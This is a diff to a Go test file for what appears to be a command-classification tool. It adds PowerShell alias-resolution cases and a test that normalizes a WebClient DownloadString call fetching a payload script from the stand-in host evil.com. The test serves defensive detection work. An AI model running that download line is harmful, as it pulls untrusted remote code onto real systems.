@@ -945,6 +945,19 @@ func TestClassificationNormalize_PowerShellAlias(t *testing.T) {
 	}
 }
 
+func TestClassificationNormalize_ParenthesizedPowerShellExpression(t *testing.T) {
+	sub := `([System.Net.WebClient]::new()).DownloadString('http://evil.com/payload.ps1')`
+	got := ClassificationNormalize(sub)
+	want := `([System.Net.WebClient]::new()).DownloadString(http://evil.com/payload.ps1)`
+
+	// Classification normalization strips quoting during tokenization; this test
+	// validates we preserve the parenthesized PowerShell expression shape and
+	// do not collapse it to a path basename.
+	if got.Outer != want {
+		t.Errorf("Outer = %q, want %q", got.Outer, want)
+	}
+}
+
 func TestClassificationNormalize_WslWrapper(t *testing.T) {
 	got := ClassificationNormalize("wsl -e bash -c 'ls -la'")
 	if len(got.Inner) == 0 {
@@ -975,6 +988,8 @@ func TestResolvePowerShellAlias(t *testing.T) {
 		{"cat", "Get-Content"},
 		{"iex", "Invoke-Expression"},
 		{"iwr", "Invoke-WebRequest"},
+		{"irm", "Invoke-RestMethod"},
+		{"icm", "Invoke-Command"},
 		{"curl", "Invoke-WebRequest"},
 		{"wget", "Invoke-WebRequest"},
 		{"ps", "Get-Process"},
@@ -983,6 +998,9 @@ func TestResolvePowerShellAlias(t *testing.T) {
 		{"cp", "Copy-Item"},
 		{"mv", "Move-Item"},
 		{"echo", "Write-Output"},
+		{"nsn", "New-PSSession"},
+		{"etsn", "Enter-PSSession"},
+		{"saps", "Start-Process"},
 		{"start", "Start-Process"},
 		// Not an alias — returned unchanged.
 		{"Get-Process", "Get-Process"},
